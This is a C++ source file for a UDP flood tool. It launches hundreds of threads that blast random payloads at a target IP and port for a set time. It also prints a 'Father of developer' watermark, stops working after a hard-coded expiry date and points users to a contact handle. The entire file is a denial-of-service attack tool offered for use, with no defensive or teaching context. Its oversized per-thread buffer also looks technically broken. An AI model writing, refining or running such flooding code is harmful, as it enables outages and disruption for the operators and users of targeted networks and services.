#include <iostream>
#include <cstdlib>
#include <ctime>
#include <string>
#include <vector>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <thread>
#include <mutex>

#define PAYLOAD_SIZE 9999999  // Increased payload size

std::mutex log_mutex;

// Function to generate a random string in different fonts for a given name
std::string generate_custom_font(const std::string &name) {
    // Array of different Unicode styles for the name
    std::vector<std::string> font_styles = {
        "📷 ₣₳₮ⱧɆⱤ 😎 Ø₣ 😎 ĐɆVⱠØ₱ɆⱤ 📷",  // Style 1
        "❤️》💙》 Father of devloper 🩸💥🔥",            // Style 2
        "❤️█║▌║█│▌💙 ƒαтнєя σƒ ∂єνℓσρєя ✔💯",         // Style 3
        "👑__Father_🔥_of_🔥_devloper__👑",              // Style 4
        "꧁・┆✦ʚ 𝙵𝚊𝚝𝚑𝚎𝚛 ♡ 𝚘𝚏 ♡ 𝚍𝚎𝚟𝚕𝚘𝚙𝚎𝚛 ɞ✦ ┆・꧂", // Style 5
        "🔥(✖₣₳₮ⱧɆⱤ Ø₣ ĐɆVⱠØ₱ɆⱤ✖)🔥",            // Style 6
        "𝙁𝙖𝙩𝙝𝙚𝙧 𝙤𝙛 𝙙𝙚𝙫𝙡𝙤𝙥𝙚𝙧"              // Style 7
    };
    
    // Randomly select a font style for the given name
    return font_styles[rand() % font_styles.size()];
}

// Function to generate a watermark with auto-generated font
std::string generate_watermark(const std::string &name) {
    std::string watermark = "★彡[ ";

    // Add the name with a random font style
    watermark += generate_custom_font(name);

    watermark += " ]彡★";

    return watermark;
}

// Function to generate a random payload for UDP packets
void generate_payload(char *buffer, size_t size) {
    static const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+|=-[]{};':,.<>?/~`";  
    for (size_t i = 0; i < size; ++i) {
        buffer[i] = charset[rand() % (sizeof(charset) - 1)];
    }
}

// UDP attack thread function
void udp_attack_thread(const char *ip, int port, int attack_time, int thread_id) {
    sockaddr_in server_addr{};
    char buffer[PAYLOAD_SIZE];

    // Create a UDP socket
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        std::lock_guard<std::mutex> lock(log_mutex);
        std::cerr << "Thread " << thread_id << " - Error: Unable to create socket." << std::endl;
        return;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &server_addr.sin_addr);

    generate_payload(buffer, PAYLOAD_SIZE);

    time_t start_time = time(nullptr);
    while (time(nullptr) - start_time < attack_time) {
        sendto(sock, buffer, PAYLOAD_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
    }

    close(sock);
    std::lock_guard<std::mutex> lock(log_mutex);
    std::cout << "Thread " << thread_id << " completed its attack." << std::endl;
}

bool is_expired() {
    std::tm expiry = {0};
    expiry.tm_year = 124; // Year since 1900
    expiry.tm_mon = 11;    // Month 0-11
    expiry.tm_mday = 01;        // Day
    time_t expiry_time = std::mktime(&expiry);

    return std::time(nullptr) > expiry_time;
}

int main(int argc, char *argv[]) {
    srand(static_cast<unsigned int>(time(0)));  // Initialize random seed

    if (is_expired()) {
        std::cout << "\n============================\n";
        std::cout << "this FILE HASH BEEN CLOSED CONTACT TO @KIING_OP " << generate_watermark("Father of Developer") << ".\n";
        std::cout << "============================\n";
        return EXIT_FAILURE;
    }

    if (argc != 4 && argc != 5) {
        std::cerr << "Usage: " << argv[0] << " <IP> <Port> <Time> [Threads]" << std::endl;
        return EXIT_FAILURE;
    }

    const char *ip = argv[1];
    int port = std::stoi(argv[2]);
    int duration = std::stoi(argv[3]);
    int thread_count = (argc > 4) ? std::stoi(argv[4]) : 800;

    std::cout << "\n============================\n";
    std::cout << "Watermark: " << generate_watermark("Father of Developer") << "\n";
    std::cout << "============================\n";

    std::vector<std::thread> threads;
    for (int i = 0; i < thread_count; ++i) {
        threads.emplace_back(udp_attack_thread, ip, port, duration, i + 1);
    }

    for (auto &thread : threads) {
        if (thread.joinable()) {
            thread.join();
        }
    }

    std::cout << "MULTI-THREADED ATTACK COMPLETED." << std::endl;
    return EXIT_SUCCESS;
}